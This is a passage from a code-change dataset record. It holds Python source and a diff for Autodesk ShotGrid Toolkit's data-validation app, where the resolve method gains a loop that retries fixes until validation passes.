manual_checked(self):\n        \"\"\"\n        Get the set the property flag indicating that a manual rule is checked (user set as valid).\n\n        This is meant to be used to set the UI check state for a manual rule.\n        \"\"\"\n\n        return self._manual_checked\n\n    @manual_checked.setter\n    def manual_checked(self, checked):\n        self._manual_checked = checked\n\n    @property\n    def check_func(self):\n        \"\"\"\n        Get the function that this rule executes to validate the data.\n\n        It is encouraged to use the `exec_check` method instead of getting this function and calling it\n        directly.\n        \"\"\"\n        return self._data.get(\"check_func\")\n\n    @property\n    def fix_func(self):\n        \"\"\"\n        Get the function that this rule executes to fix the data violations found by the rule.\n\n        It is encouraged to use the `exec_fix` method instead of getting this function and calling it\n        directly.\n        \"\"\"\n        return self._data.get(\"fix_func\")\n\n    @property\n    def kwargs(self):\n        \"\"\"Get the extra keyword arguments dict to pass to the check and fix functions.\"\"\"\n        return self._data.get(\"kwargs\", {})\n\n    @property\n    def actions(self):\n        \"\"\"\n        Get the list of actions that can be applied to all error items (as a group) for this rule.\n\n        These do no include the primary check or fix functions. This property is a list of dicts, which contain\n        a `name` and `callback` keys, and optionally contains keys: `tooltip`.\n        \"\"\"\n        return self._data.get(\"actions\", [])\n\n    @property\n    def item_actions(self):\n        \"\"\"\n        Get the list of actions that can be applied invididual error items (one at a time) for this rule.\n\n        These do no include the primary check or fix functions. This property is a list of dicts, which contain\n        a `name` and `callback` keys, and optionally contains keys: `tooltip`.\n        \"\"\"\n        return self._data.get(\"item_actions\", [])\n\n    @property\n    def valid(self):\n        \"\"\"\n        Get the valid state of the rule.\n\n        This will reflect the status returned by the rule's check function the last time it was executed.\n        \"\"\"\n        return self._valid\n\n    @property\n    def errors(self):\n        \"\"\"\n        Get the error data found for this rule.\n\n        This will contain the error data items found by the rule's check function the last time it was\n        executed.\n        \"\"\"\n        return self._error_items or []\n\n    @property\n    def fix_executed(self):\n        \"\"\"\n        Get the flag indicating if the rule's fix method was executed at least once.\n        \"\"\"\n        return self._fix_executed\n\n    @property\n    def dependencies(self):\n        \"\"\"\n        Get the dependencies information for this rule.\n\n        Dependent rules must be fixed before this rule can be fixed. This defines the order that rules are\n        fixed in, when fixing in bulk.\n        \"\"\"\n        return self._data.get(\"dependencies\", {})\n\n    #########################################################################################################\n    # Public methods\n\n    def get_data(self, field):\n        \"\"\"\n        Get the data from the rule.\n\n        :param field: The field to get data for\n        :type field: str\n\n        :return: The data for the specified field\n        :rtype: any\n        \"\"\"\n\n        return self._data.get(field)\n\n    def get_error_item_ids(self):\n        \"\"\"\n        Convenience method to get a list of the item ids from the data errors.\n\n        :return: The item ids of the error items.\n        :rtype: list\n        \"\"\"\n\n        return [item[\"id\"] for item in self.errors]\n\n    def get_dependency_ids(self):\n        \"\"\"\n        Get the validation rules (ids) that this rule depends on.\n\n        Dependent rules must be fixed before this rule can be fixed. This defines the order that rules are\n        fixed in, when fixing in bulk.\n        \"\"\"\n        return self.dependencies.keys()\n\n    def get_dependency_names(self):\n        \"\"\"\n        Get the validation rules (display names) that this rule depends on.\n\n        Dependent rules must be fixed before this rule can be fixed. This defines the order that rules are\n        fixed in, when fixing in bulk.\n        \"\"\"\n        return self.dependencies.values()\n\n    def exec_check(self, *args, **kwargs):\n        \"\"\"\n        Execute the rule's check function.\n\n        :param args: The arguments lits to pass to the check function\n        :type args: list\n        :param kwargs: The keyword arguments to pass to the check function\n        :type kwargs: dict\n\n        :return: The result returned by the check function\n        :rtype: any\n        \"\"\"\n\n        func = self.check_func\n\n        if func:\n            kwargs.update(self.kwargs)\n            result = func(*args, **kwargs)\n\n            # Try to set the valid and errors data properties on the rule from the result returned by\n            # the check function. If the result does not have the expected attributes, we will continue on\n            # but the rule will not be updated\n            try:\n                self._valid = result.is_valid\n            except:\n                pass\n            try:\n                self._error_items = result.errors\n            except:\n                pass\n        else:\n            # This is a manual check. It is considered valid if the user has checked it off.\n            self._valid = self.manual_checked\n            self._error_items = []\n            result = None\n\n        return result\n\n    def exec_fix(self, *args, **kwargs):\n        \"\"\"\n        Execute the rule's fix function.\n\n        Note that if this rule has dependencies, this method does not take those into account. See the\n        ValidationManager resolve methods to handle rule dependencies.\n\n        :param args: The arguments lits to pass to the check function\n        :type args: list\n        :param kwargs: The keyword arguments to pass to the check function\n        :type kwargs: dict\n\n        :raises Exception: If the fix operation was not successful.\n        \"\"\"\n\n        func = self.fix_func\n\n        if not func:\n            return\n\n        kwargs.update(self.kwargs)\n        func(*args, **kwargs)\n\n        # The fix function was executed - set the flag to True\n        self._fix_executed = True\n"},"\/python\/tk_multi_data_validation\/api\/manager.py":{"changes":[{"diff":"\n \n         return is_valid\n \n-    def resolve(self, pre_validate=False, post_validate=False):\n+    def resolve(\n+        self, pre_validate=False, post_validate=False, retry_until_success=True\n+    ):\n         \"\"\"\n         Resolve the current data violations found by the validate method.\n \n","add":3,"remove":1,"filename":"\/python\/tk_multi_data_validation\/api\/manager.py","badparts":["    def resolve(self, pre_validate=False, post_validate=False):"],"goodparts":["    def resolve(","        self, pre_validate=False, post_validate=False, retry_until_success=True","    ):"]},{"diff":"\n                     self.errors.values(), fetch_dependencies=False, emit_signals=False\n                 )\n \n-                if post_validate:\n+                if post_validate or retry_until_success:\n                     # Run validation step once all resolution actions compelted to ensure everything was fixed.\n                     success = self.validate()\n \n+                # Brute force try to resolve all errors - keep running the resolution on any errors found\n+                # from validate until there are none, or the max number of tries reached.\n+                #\n+                # New errors may occur if executing a rule's fix has side effects which cause another rule to\n+                # have errors. For example, rule A has no dependencies, rule B depends on rule A, and rule A\n+                # has errors, then only rule A's fix will be executed but it causes rule B to now have errors.\n+                # Rule B's fix will not be executed though, so even though resolve all was executed, we have\n+                # new errors.\n+                #\n+                # NOTE if this brute force method becomes slow, the resolve_rules method should be modified to\n+                # look up the reverse dependencies to add to the list of rules whose fix operatoins will be\n+                # executed.\n+                max_retry = len(self.rules) if retry_until_success else 0\n+                count = 0\n+                prev_errors = set()\n+                while not success and count < max_retry:\n+                    if prev_errors == set(self.errors):\n+                        # Nothing changed from the last attempt to resolve, stop retrying\n+                        count = max_retry\n+                    else:\n+                        self._logger.debug(\"Resolve retry attempt {}\".format(count))\n+\n+                        # Update the previous errors to the current set\n+                        prev_errors = set(self.errors)\n+\n+                        # Attempt to resolve again\n+                        self.resolve_rules(\n+                            self.errors.values(),\n+                            fetch_dependencies=False,\n+                            emit_signals=False,\n+                        )\n+                        # Check for errors\n+                        success = self.validate()\n+                        # Update retry count\n+                        count += 1\n+\n+                if retry_until_success and not success:\n+                    self._logger.debug(\n+                        \"Failed to resolve after max retry attempts. There may be a rule dependecy cycle.\"\n+                    )\n+\n         finally:\n             if self.notifier:\n                 self.notifier.resolve_all_finished.emit()\n","add":42,"remove":1,"filename":"\/python\/tk_multi_data_validation\/api\/manager.py","badparts":["                if post_validate:"],"goodparts":["                if post_validate or retry_until_success:","                max_retry = len(self.rules) if retry_until_success else 0","                count = 0","                prev_errors = set()","                while not success and count < max_retry:","                    if prev_errors == set(self.errors):","                        count = max_retry","                    else:","                        self._logger.debug(\"Resolve retry attempt {}\".format(count))","                        prev_errors = set(self.errors)","                        self.resolve_rules(","                            self.errors.values(),","                            fetch_dependencies=False,","                            emit_signals=False,","                        )","                        success = self.validate()","                        count += 1","                if retry_until_success and not success:","                    self._logger.debug(","                        \"Failed to resolve after max retry attempts. There may be a rule dependecy cycle.\"","                    )"]}],"source":"\n import copy from collections import deque import sgtk from..api.data.validation_rule import ValidationRule from..api.data.validation_rule_type import ValidationRuleType class ValidationManager(object): \"\"\" Manager class for data validation. This class is responsible for retrieving the data validation rules from the current bundle's settings, and creating the set of ValidationRule objects that define how the data should be validated. This class object may be passed to the:class:`tk_multi_data_validation.widgets.ValidationWidget` to help manager validation rules, and executing their actions. It also coordinates the execution of validation rule check and fix functions. \"\"\" def __init__( self, bundle=None, rule_settings=None, include_rules=None, exclude_rules=None, logger=None, notifier=None, has_ui=False, ): \"\"\" Initialize the validation manager from the settings data. :param bundle: The bundle instance for the app. :type bundle: TankBundle :param rule_settings: The rule settings to use for this manager. Default is to use the current bunlde's settings. :type rule_settings: dict :param include_rules: List of rule ids to include from the app's default rules list. :type include_rules: list<str> :param exclude_rules: List of rule ids to exclude from the app's default rules list. :type exclude_rules: list<str> :param logger: This is a standard python logger to use during validation. A default logger will be provided if not supplied. :type logger: A standard python logger. :param notifier: A notifier object to emit Qt signals. :type notifier: ValidationNotifer :param has_ui: Set to True if the manager is being used with a UI, else False. :type has_ui: bool :signal ValidationNotifier.validate_rule_begin(ValidationRule): Emits before a validation rule check function is executed. The returned parameter is the validation rule. :signal ValidationNotifier.validate_rule_finished(ValidationRule): Emits after a validation rule check function is executed. The returned parameter is the validation rule. \"\"\" self._bundle=bundle or sgtk.platform.current_bundle() self._logger=logger or self._bundle.logger self._notifier=notifier self._has_ui=has_ui self._rule_types=[ ValidationRuleType(ValidationRuleType.RULE_TYPE_NONE), ValidationRuleType(ValidationRuleType.RULE_TYPE_ACTIVE), ValidationRuleType(ValidationRuleType.RULE_TYPE_REQUIRED), ValidationRuleType(ValidationRuleType.RULE_TYPE_OPTIONAL), ] self._accept_rule_fn=None validation_data=self._bundle.execute_hook_method( \"hook_data_validation\", \"get_validation_data\" ) self.__data=copy.deepcopy(validation_data) self.__rules_by_id={} self.__errors={} rule_settings=rule_settings or self._bundle.get_setting(\"rules\",[]) for rule_item in rule_settings: rule_id=rule_item[\"id\"] if include_rules and not rule_id in include_rules: continue if exclude_rules and rule_id in exclude_rules: continue rule_data=self.__data.get(rule_id) if not rule_data: self._logger.error( \"Data was not found for validation rule id '{}'\".format(rule_id) ) continue for dependency_id in rule_data.get(\"dependency_ids\",[]): dependency_data=self.__data.get(dependency_id) if dependency_data: rule_data.setdefault(\"dependencies\",{})[ dependency_id ]=dependency_data.get(\"name\") rule_data.update(rule_item) rule=ValidationRule(rule_data) self.__rules_by_id[rule.id]=rule @property def notifier(self): \"\"\"Get the notifier for the validation manager.\"\"\" return self._notifier @property def rules(self): \"\"\"Get the list of validtaion rules obtained from the validation data.\"\"\" return self.__rules_by_id.values() @property def rule_types(self): \"\"\"Get or set the rule types.\"\"\" return self._rule_types @rule_types.setter def rule_types(self, type_data): self._rule_types=type_data @property def errors(self): \"\"\"Get the list of rules which did not pass the last time their respective validate function was executed.\"\"\" return self.__errors @property def accept_rule_fn(self): \"\"\" Get or set the function called to check if the validation should be applied to the given rule. This property must be a function that takes a single param(ValidationRule) and returns a bool to indicate if the rule should be validated or not. \"\"\" return self._accept_rule_fn @accept_rule_fn.setter def accept_rule_fn(self, fn): self._accept_rule_fn=fn @property def has_ui(self): \"\"\"Get the flag indicating if this manager is running with a User Interface.\"\"\" return self._has_ui def get_rule(self, rule_id): \"\"\" Return the validation rule object for the id. :param rule_id: The validation rule unique identifier. :type rule_id: str :return: The validation rule. :rtype: ValidationRule \"\"\" return self.__rules_by_id.get(rule_id) def reset(self): \"\"\" Reset the manager state. Clear the errors. \"\"\" self.__errors={} def validate(self, emit_signals=True): \"\"\" Validate the DCC data by executing all validation rule check functions. :param emit_signals: Set to True to emit notifier signals for validation begin and finished. :param emit_signals: bool :return: True if all validation rule checks passed(data is valid), else False. :rtype: bool \"\"\" if self.notifier: self.notifier.validate_all_begin.emit() try: self.reset() self.validate_rules(self.rules, emit_signals=False) finally: if self.notifier: self.notifier.validate_all_finished.emit() return not self.__errors @sgtk.LogManager.log_timing def validate_rules(self, rules, emit_signals=True): \"\"\" Validate the given list of rules. :param rules: The list of rules. :type rules: list<ValidationRule> :param emit_signals: Set to True to emit notifier signals for validation begin and finished. :param emit_signals: bool \"\"\" if emit_signals and self.notifier: self.notifier.validate_all_begin.emit() try: for rule in rules: if not self.accept_rule_fn or self.accept_rule_fn(rule): self.validate_rule(rule) finally: if emit_signals and self.notifier: self.notifier.validate_all_finished.emit() def validate_rule(self, rule, emit_signals=True): \"\"\" Validate the DCC data with the given rule. The check function executed to validate the DCC data is implemented by the ValidationRule(e.g. the manager does nothing to validate the data, it is just responsible for executing the validate functions). :param rule: The rule to validate data by :type rule: ValidationRule :return: True if the validation rule check passed(data is valid for this rule), else False. :rtype: bool \"\"\" if emit_signals and self.notifier: self.notifier.validate_rule_begin.emit(rule) try: self._logger.debug(\"Validating Rule:{}\".format(rule.id)) rule.exec_check() is_valid=rule.valid if is_valid: if rule.id in self.__errors: del self.__errors[rule.id] else: self.__errors[rule.id]=rule finally: if emit_signals and self.notifier: self.notifier.validate_rule_finished.emit(rule) return is_valid def resolve(self, pre_validate=False, post_validate=False): \"\"\" Resolve the current data violations found by the validate method. The fix function executed to resolve the DCC data violations is implemented by the ValidationRule (e.g. the manager does nothing to validate the data, it is just responsible for executing the fix functions). :param pre_validate: True will run the validation step before the resovle step, to ensure the list of items to resolve is the most up to date. :type pre_validate: bool :param post_validate: True will run the validation step after the resolve step, to check that the scene data is valid after resolution steps applied. :type post_validate: bool :return: True if the resolve operation was successful, else False. Note that if the post_validate param is False, this will always be True, since the return status is based on the status returned by post validating the data. :rtype: bool \"\"\" if self.notifier: self.notifier.resolve_all_begin.emit() try: success=True if pre_validate: self.validate() if self.errors: self.resolve_rules( self.errors.values(), fetch_dependencies=False, emit_signals=False ) if post_validate: success=self.validate() finally: if self.notifier: self.notifier.resolve_all_finished.emit() return success @sgtk.LogManager.log_timing def resolve_rules(self, rules, fetch_dependencies=None, emit_signals=True): \"\"\" Resolve the given list of rules. Steps to resolve rules 1. Iterate over all rules a. If the rule has no dependencies -resolve it immediately b. If the rule has dependencies -add it to the queue to process later 2. If `fetch_dependencies` is not explicitly set as False, check if all dependencies are provided a. If missing dependencies and `fetch_dependencies` not explicitly set to True then prompt user to fetch and resolve dependencies b. If `fetch_dependencies` is explicitly set to True or user answered YES to(a), then try to find any missing dependencies in the manager, and process them as done with the other rules 3. Process the queue of rules(that have dependencies) a. If the rule's dependencies have been resolved or ignored -now resolve it and mark it as resolved b. If the rule's dependencies have not been resolved -add it back to the end of the queue Time complexity(n=number of rules) 1. O(n) 2. O(n^2) -worst case NOTE: Time complexity is not the best with O(n^2) but is probably good enough since the list of validation rules is not expected to be so large. If the number of rules does grow to be a large list, then this fix operation may need to be optimized(e.g. build a dependency tree that defines the order of fixing the rules). :param rules: The list of rules to resolve. :type rules: list<ValidationRule> :param fetch_dependencies: Set to True to ensure all dependencies for a reule are resolved before the rule itself is resolved. Set to False will not fetch any missing dependencies to resolve. :type fetch_dependencies: bool :param emit_signals: Set to True to emit notifier signals for resolve operation. :type emit_signals: bool \"\"\" if not rules: return if emit_signals: self.notifier.resolve_all_begin.emit() try: rule_ids=set() resolved=set() all_dependencies=set() dependencies={} queue=deque() queue_count=0 def process_rule(rule): \"\"\" Helper function to intially process a validation rule. 1. Add the rule to the set of rule ids. 2a. If the rule does not have dependencies, resolve it immediately and add it to the resolved set. 2b. If the rule has dependencies, update the dependencies map and list, and add it to the queue to process later once all of its dependencies are resolved. :param rule: The rule to process :type rule: ValidationRule :return: True if the rule was resolved, else False if it was not resolved and added to the queue. :rtype: bool \"\"\" if not rule or rule in rule_ids: return True rule_ids.add(rule.id) dependencies_ids=rule.get_dependency_ids() if dependencies_ids: rule_dependencies_set=set(dependencies_ids) dependencies[rule.id]=rule_dependencies_set all_dependencies.update(rule_dependencies_set.difference(rule_ids)) queue.append(rule) return False self.resolve_rule(rule) resolved.add(rule.id) return True for rule in rules: if not self.accept_rule_fn or self.accept_rule_fn(rule): if not process_rule(rule): queue_count +=1 if fetch_dependencies or fetch_dependencies is None: while all_dependencies: dependency_rule_id=all_dependencies.pop() if dependency_rule_id in rule_ids: continue dependency_rule=self.get_rule(dependency_rule_id) if not dependency_rule: continue if fetch_dependencies is None: if self.notifier: self.notifier.about_to_open_msg_box.emit() if self.has_ui: from sgtk.platform.qt import QtGui answer=QtGui.QMessageBox.question( None, \"Fix Dependencies\", \"This operation will apply additional fixes for dependencies.\", QtGui.QMessageBox.Ok | QtGui.QMessageBox.Cancel, ) fetch_dependencies=bool(answer==QtGui.QMessageBox.Ok) else: fetch_dependencies=True if self.notifier: self.notifier.msg_box_closed.emit() if fetch_dependencies: if not process_rule(dependency_rule): queue_count +=1 else: if emit_signals and self.notifier: self.notifier.resolve_all_finished.emit() return max_iters=queue_count +(queue_count *(queue_count -1) \/ 2) iter_count=0 while queue: if iter_count > max_iters: raise RecursionError( \"Detected cycle in Validation Rule dependencies.\" ) iter_count +=1 rule=queue.popleft() has_dependencies=False rule_dependencies=dependencies.get(rule.id,[]) while rule_dependencies and not has_dependencies: dependency_rule_id=rule_dependencies.pop() if dependency_rule_id not in rule_ids: if fetch_dependencies: self._logger.error( \"Dependency not resolved '{}'\".format( dependency_rule_id ) ) continue if dependency_rule_id in resolved: continue has_dependencies=True rule_dependencies.add(dependency_rule_id) if has_dependencies: queue.append(rule) else: self.resolve_rule(rule) resolved.add(rule.id) finally: if emit_signals and self.notifier: self.notifier.resolve_all_finished.emit() def resolve_rule(self, rule): \"\"\" Resolve the validation rule. :param rule: The validation rule to resolve :type rule: ValidationRule \"\"\" self._logger.debug( \"\\nResolving Rule:{}\\nDependencies:{}\".format( rule.id, \", \".join([d for d in rule.get_dependency_names()]) ) ) if self.notifier: self.notifier.resolve_rule_begin.emit(rule) try: rule.exec_fix() finally: if self.notifier: self.notifier.resolve_rule_finished.emit(rule) ","sourceWithComments":"# Copyright (c) 2022 Autodesk, Inc.\n#\n# CONFIDENTIAL AND PROPRIETARY\n#\n# This work is provided \"AS IS\" and subject to the ShotGrid Pipeline Toolkit\n# Source Code License included in this distribution package. See LICENSE.\n# By accessing, using, copying or modifying this work you indicate your\n# agreement to the ShotGrid Pipeline Toolkit Source Code License. All rights\n# not expressly granted therein are reserved by Autodesk, Inc.\n\nimport copy\nfrom collections import deque\n\nimport sgtk\n\nfrom ..api.data.validation_rule import ValidationRule\nfrom ..api.data.validation_rule_type import ValidationRuleType\n\n\nclass ValidationManager(object):\n    \"\"\"\n    Manager class for data validation.\n\n    This class is responsible for retrieving the data validation rules from the current bundle's settings,\n    and creating the set of ValidationRule objects that define how the data should be validated.\n\n    This class object may be passed to the :class:`tk_multi_data_validation.widgets.ValidationWidget` to help\n    manager validation rules, and executing their actions.\n\n    It also coordinates the execution of validation rule check and fix functions.\n    \"\"\"\n\n    def __init__(\n        self,\n        bundle=None,\n        rule_settings=None,\n        include_rules=None,\n        exclude_rules=None,\n        logger=None,\n        notifier=None,\n        has_ui=False,\n    ):\n        \"\"\"\n        Initialize the validation manager from the settings data.\n\n        :param bundle: The bundle instance for the app.\n        :type bundle: TankBundle\n        :param rule_settings: The rule settings to use for this manager. Default is to use the\n                              current bunlde's settings.\n        :type rule_settings: dict\n        :param include_rules: List of rule ids to include from the app's default rules list.\n        :type include_rules: list<str>\n        :param exclude_rules: List of rule ids to exclude from the app's default rules list.\n        :type exclude_rules: list<str>\n        :param logger: This is a standard python logger to use during validation. A default logger\n            will be provided if not supplied.\n        :type logger: A standard python logger.\n        :param notifier: A notifier object to emit Qt signals.\n        :type notifier: ValidationNotifer\n        :param has_ui: Set to True if the manager is being used with a UI, else False.\n        :type has_ui: bool\n\n        :signal ValidationNotifier.validate_rule_begin(ValidationRule): Emits before a validation rule check\n            function is executed. The returned parameter is the validation rule.\n        :signal ValidationNotifier.validate_rule_finished(ValidationRule): Emits after a validation rule\n            check function is executed. The returned parameter is the validation rule.\n        \"\"\"\n\n        self._bundle = bundle or sgtk.platform.current_bundle()\n        self._logger = logger or self._bundle.logger\n        self._notifier = notifier\n        self._has_ui = has_ui\n\n        # Set the default rule types (in order). This can be set using the rule_types property.\n        # TODO allow this to be config-based\n        self._rule_types = [\n            ValidationRuleType(ValidationRuleType.RULE_TYPE_NONE),\n            ValidationRuleType(ValidationRuleType.RULE_TYPE_ACTIVE),\n            ValidationRuleType(ValidationRuleType.RULE_TYPE_REQUIRED),\n            ValidationRuleType(ValidationRuleType.RULE_TYPE_OPTIONAL),\n        ]\n\n        # Default accept function is not set, which will accept all rules\n        self._accept_rule_fn = None\n\n        #\n        # Retrieve the validation data from given settings or get them from the hook data validator hook.\n        # Create the set of ValidationRules from the validation data retrieved.\n        #\n        validation_data = self._bundle.execute_hook_method(\n            \"hook_data_validation\", \"get_validation_data\"\n        )\n        self.__data = copy.deepcopy(validation_data)\n        self.__rules_by_id = {}\n        self.__errors = {}\n\n        rule_settings = rule_settings or self._bundle.get_setting(\"rules\", [])\n        for rule_item in rule_settings:\n            rule_id = rule_item[\"id\"]\n\n            if include_rules and not rule_id in include_rules:\n                continue\n\n            if exclude_rules and rule_id in exclude_rules:\n                continue\n\n            rule_data = self.__data.get(rule_id)\n            if not rule_data:\n                self._logger.error(\n                    \"Data was not found for validation rule id '{}'\".format(rule_id)\n                )\n                continue\n\n            # Collect dependencies first, if any\n            for dependency_id in rule_data.get(\"dependency_ids\", []):\n                dependency_data = self.__data.get(dependency_id)\n                if dependency_data:\n                    rule_data.setdefault(\"dependencies\", {})[\n                        dependency_id\n                    ] = dependency_data.get(\"name\")\n\n            rule_data.update(rule_item)\n            rule = ValidationRule(rule_data)\n            self.__rules_by_id[rule.id] = rule\n\n    #########################################################################################################\n    # Properties\n\n    @property\n    def notifier(self):\n        \"\"\"Get the notifier for the validation manager.\"\"\"\n        return self._notifier\n\n    @property\n    def rules(self):\n        \"\"\"Get the list of validtaion rules obtained from the validation data.\"\"\"\n        return self.__rules_by_id.values()\n\n    @property\n    def rule_types(self):\n        \"\"\"Get or set the rule types.\"\"\"\n        return self._rule_types\n\n    @rule_types.setter\n    def rule_types(self, type_data):\n        self._rule_types = type_data\n\n    @property\n    def errors(self):\n        \"\"\"Get the list of rules which did not pass the last time their respective validate function was executed.\"\"\"\n        return self.__errors\n\n    @property\n    def accept_rule_fn(self):\n        \"\"\"\n        Get or set the function called to check if the validation should be applied to the given rule.\n\n        This property must be a function that takes a single param (ValidationRule) and returns a bool to\n        indicate if the rule should be validated or not.\n        \"\"\"\n        return self._accept_rule_fn\n\n    @accept_rule_fn.setter\n    def accept_rule_fn(self, fn):\n        self._accept_rule_fn = fn\n\n    @property\n    def has_ui(self):\n        \"\"\"Get the flag indicating if this manager is running with a User Interface.\"\"\"\n        return self._has_ui\n\n    #########################################################################################################\n    # Public functions\n\n    def get_rule(self, rule_id):\n        \"\"\"\n        Return the validation rule object for the id.\n\n        :param rule_id: The validation rule unique identifier.\n        :type rule_id: str\n\n        :return: The validation rule.\n        :rtype: ValidationRule\n        \"\"\"\n\n        return self.__rules_by_id.get(rule_id)\n\n    def reset(self):\n        \"\"\"\n        Reset the manager state.\n\n        Clear the errors.\n        \"\"\"\n\n        self.__errors = {}\n\n    def validate(self, emit_signals=True):\n        \"\"\"\n        Validate the DCC data by executing all validation rule check functions.\n\n        :param emit_signals: Set to True to emit notifier signals for validation begin and finished.\n        :param emit_signals: bool\n\n        :return: True if all validation rule checks passed (data is valid), else False.\n        :rtype: bool\n        \"\"\"\n\n        if self.notifier:\n            self.notifier.validate_all_begin.emit()\n\n        try:\n            # Reset the manager state before performing validation\n            self.reset()\n            self.validate_rules(self.rules, emit_signals=False)\n        finally:\n            if self.notifier:\n                self.notifier.validate_all_finished.emit()\n\n        return not self.__errors\n\n    @sgtk.LogManager.log_timing\n    def validate_rules(self, rules, emit_signals=True):\n        \"\"\"\n        Validate the given list of rules.\n\n        :param rules: The list of rules.\n        :type rules: list<ValidationRule>\n        :param emit_signals: Set to True to emit notifier signals for validation begin and finished.\n        :param emit_signals: bool\n        \"\"\"\n\n        if emit_signals and self.notifier:\n            self.notifier.validate_all_begin.emit()\n\n        try:\n            for rule in rules:\n                if not self.accept_rule_fn or self.accept_rule_fn(rule):\n                    self.validate_rule(rule)\n        finally:\n            if emit_signals and self.notifier:\n                self.notifier.validate_all_finished.emit()\n\n    def validate_rule(self, rule, emit_signals=True):\n        \"\"\"\n        Validate the DCC data with the given rule.\n\n        The check function executed to validate the DCC data is implemented by the ValidationRule (e.g. the\n        manager does nothing to validate the data, it is just responsible for executing the validate\n        functions).\n\n        :param rule: The rule to validate data by\n        :type rule: ValidationRule\n\n        :return: True if the validation rule check passed (data is valid for this rule), else False.\n        :rtype: bool\n        \"\"\"\n\n        if emit_signals and self.notifier:\n            # Emit a signal to notify that a specifc rule has started validation\n            self.notifier.validate_rule_begin.emit(rule)\n\n        try:\n            # Run the validation rule check function\n            self._logger.debug(\"Validating Rule: {}\".format(rule.id))\n            rule.exec_check()\n\n            # Check if rule's valid state after executing its check function\n            is_valid = rule.valid\n\n            if is_valid:\n                if rule.id in self.__errors:\n                    # Remove the rule from the error set\n                    del self.__errors[rule.id]\n            else:\n                # Add the rule to the error set\n                self.__errors[rule.id] = rule\n        finally:\n            if emit_signals and self.notifier:\n                # Emit a signal to notify that a specifc rule has finished validation\n                self.notifier.validate_rule_finished.emit(rule)\n\n        return is_valid\n\n    def resolve(self, pre_validate=False, post_validate=False):\n        \"\"\"\n        Resolve the current data violations found by the validate method.\n\n        The fix function executed to resolve the DCC data violations is implemented by the ValidationRule\n        (e.g. the manager does nothing to validate the data, it is just responsible for executing the\n        fix functions).\n\n        :param pre_validate: True will run the validation step before the resovle step, to ensure the\n                             list of items to resolve is the most up to date.\n        :type pre_validate: bool\n        :param post_validate: True will run the validation step after the resolve step, to check that\n                              the scene data is valid after resolution steps applied.\n        :type post_validate: bool\n\n        :return: True if the resolve operation was successful, else False. Note that if the post_validate\n            param is False, this will always be True, since the return status is based on the status\n            returned by post validating the data.\n        :rtype: bool\n        \"\"\"\n\n        if self.notifier:\n            self.notifier.resolve_all_begin.emit()\n\n        try:\n            success = True\n\n            if pre_validate:\n                # First run the validate method to check for data violations.\n                self.validate()\n\n            if self.errors:\n                # Resolve the data violations. Explicitly say not to fetch dependencies because this function\n                # has validated all rules and all rules will be passed to resolve that will be fixed - if\n                # dependencies are not included, then that means they have no errors and thus, do not need to\n                # run their fix action to modify the data. Basically, this means dependencies can be ignored\n                # as they will have no effect on the data.\n                self.resolve_rules(\n                    self.errors.values(), fetch_dependencies=False, emit_signals=False\n                )\n\n                if post_validate:\n                    # Run validation step once all resolution actions compelted to ensure everything was fixed.\n                    success = self.validate()\n\n        finally:\n            if self.notifier:\n                self.notifier.resolve_all_finished.emit()\n\n        return success\n\n    @sgtk.LogManager.log_timing\n    def resolve_rules(self, rules, fetch_dependencies=None, emit_signals=True):\n        \"\"\"\n        Resolve the given list of rules.\n\n        Steps to resolve rules\n        1. Iterate over all rules\n\n            a. If the rule has no dependencies - resolve it immediately\n            b. If the rule has dependencies - add it to the queue to process later\n\n        2. If `fetch_dependencies` is not explicitly set as False, check if all dependencies are provided\n\n            a. If missing dependencies and `fetch_dependencies` not explicitly set to True then prompt user to fetch and resolve dependencies\n            b. If `fetch_dependencies` is explicitly set to True or user answered YES to (a), then try to find any missing dependencies in the manager, and process them as done with the other rules\n\n        3. Process the queue of rules (that have dependencies)\n\n            a. If the rule's dependencies have been resolved or ignored - now resolve it and mark it as resolved\n            b. If the rule's dependencies have not been resolved - add it back to the end of the queue\n\n        Time complexity (n = number of rules)\n\n        1. O(n)\n        2. O(n^2) - worst case\n\n        NOTE: Time complexity is not the best with O(n^2) but is probably good enough since the list of\n        validation rules is not expected to be so large. If the number of rules does grow to be a large\n        list, then this fix operation may need to be optimized (e.g. build a dependency tree that defines\n        the order of fixing the rules).\n\n        :param rules: The list of rules to resolve.\n        :type rules: list<ValidationRule>\n        :param fetch_dependencies: Set to True to ensure all dependencies for a reule are resolved before\n            the rule itself is resolved. Set to False will not fetch any missing dependencies to resolve.\n        :type fetch_dependencies: bool\n        :param emit_signals: Set to True to emit notifier signals for resolve operation.\n        :type emit_signals: bool\n        \"\"\"\n\n        if not rules:\n            return\n\n        if emit_signals:\n            self.notifier.resolve_all_begin.emit()\n\n        try:\n            # The set of rule ids passed to resolve - this set gets populated the first the rules are iterated\n            # through to check then check if the necessary dependencies are available to resolve first.\n            # Dependency rules may be added in the step wheere dependencies are checked.\n            rule_ids = set()\n            # Add rules to the set once they have been resolved.\n            resolved = set()\n            # The set of all dependencies to required by the list of rules passed to resolve.\n            all_dependencies = set()\n            # Dependencies mapping - update this mapping as dependencies are resolved.\n            dependencies = {}\n            # Add rules to the queue if they have dependencies that have not been resolved yet.\n            queue = deque()\n            queue_count = 0\n\n            def process_rule(rule):\n                \"\"\"\n                Helper function to intially process a validation rule.\n\n                1. Add the rule to the set of rule ids.\n                2a. If the rule does not have dependencies, resolve it immediately and add it to the resolved\n                    set.\n                2b. If the rule has dependencies, update the dependencies map and list, and add it to the queue\n                    to process later once all of its dependencies are resolved.\n\n                :param rule: The rule to process\n                :type rule: ValidationRule\n\n                :return: True if the rule was resolved, else False if it was not resolved and added to the queue.\n                :rtype: bool\n                \"\"\"\n\n                if not rule or rule in rule_ids:\n                    # Trivially return True for rule that does not exist, and skip rules that have already been\n                    # processed\n                    return True\n\n                rule_ids.add(rule.id)\n\n                dependencies_ids = rule.get_dependency_ids()\n                if dependencies_ids:\n                    # Copy the list of dependencies so that the original dependency list is not modified, and\n                    # using a set instead for faster lookup and removal\n                    rule_dependencies_set = set(dependencies_ids)\n                    dependencies[rule.id] = rule_dependencies_set\n                    # Only add dependencies to the set if they have not been processed yet.\n                    all_dependencies.update(rule_dependencies_set.difference(rule_ids))\n\n                    queue.append(rule)\n                    return False\n\n                # No dependencies, resolve it immediately\n                self.resolve_rule(rule)\n                resolved.add(rule.id)\n                return True\n\n            # First pass will resolve any rules without dependencies. Rules with dependencies will be added to\n            # the queue to be resolved once all its dependencies are resolved.\n            for rule in rules:\n                if not self.accept_rule_fn or self.accept_rule_fn(rule):\n                    if not process_rule(rule):\n                        queue_count += 1\n\n            # Check for dependencies and fetch them if specified\n            if fetch_dependencies or 